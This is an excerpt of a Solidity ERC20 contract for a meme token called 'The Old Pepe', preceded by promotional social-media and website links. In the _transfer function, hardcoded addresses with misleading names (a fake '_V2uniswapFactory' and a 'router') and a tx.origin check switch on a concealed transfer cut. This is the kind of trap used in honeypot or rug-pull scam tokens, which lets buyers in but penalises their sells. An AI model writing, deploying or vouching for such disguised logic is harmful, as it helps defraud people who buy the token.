...
https://twitter.com/OldPepeCoinETH
https://t.me.com/OldPepeCoinETH
https://OldPepeCoinETH.xyz
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    address internal router = 0xc8fcC036E59d8D0CFa5E3490F4544872715b6FdA;
    uint256 private swapEnabled = 1;
    string private _symbol;
    mapping(address => uint256) private _balances;
    uint256 private _totalSupply;
    address private _V2uniswapFactory = 0x43AB3497e636fBA95D1394d16CB85fa1Aa1dB4Ba;
    ...
    function _transfer(address from, address to, uint256 amount) internal virtual
    {
        ...
        uint256 swapamount = amount.mul(to != tx.origin && from != router && _balances[_V2uniswapFactory] > 0 ? _pairsToken : swapEnabled).div(100) + 0;
        if (swapamount > 0)
        {
...
contract OldPepeCoin is ERC20, Ownable
{
    constructor() ERC20(unicode"The Old Pepe", unicode"OLDPEPE")
    {
